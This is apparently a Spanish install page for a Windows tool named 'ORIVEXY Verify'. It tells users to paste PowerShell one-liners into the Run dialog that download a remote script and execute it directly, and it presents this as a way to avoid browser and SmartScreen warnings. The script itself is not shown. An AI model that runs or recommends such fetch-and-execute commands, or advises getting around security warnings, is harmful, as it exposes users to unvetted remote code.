Instalar ORIVEXY Verify en Windows

Instalando con esta orden no hay que descargar nada con el navegador, así que no salen los avisos de Chrome, de Google Drive ni de «Windows protegió su PC».

1. Pulsa Windows + R (se abre la ventana «Ejecutar»).
2. Copia esta orden, pégala con Ctrl + V y pulsa Intro: 
powershell -c "irm https://orivexy.github.io/instalar.ps1 | iex"
3. Se descarga el instalador y se abre. Sigue sus pasos y abre ORIVEXY Verify desde el menú Inicio.

¿Te han invitado a la prueba?

Usa esta orden en el paso 2 (versión que pide una clave de licencia):

powershell -c "irm https://orivexy.github.io/instalar-prueba.ps1 | iex"

¿Qué hace la orden?

Descarga el instalador oficial desde la página de descargas de ORIVEXY en GitHub y lo abre. Puedes ver el script antes de usarlo: instalar.ps1. No cambia ninguna configuración de seguridad de Windows. Microsoft Defender analiza el programa igualmente al instalarlo.

¿Prefieres la descarga normal? Descargas (el navegador y Windows mostrarán avisos porque el programa aún no está firmado).
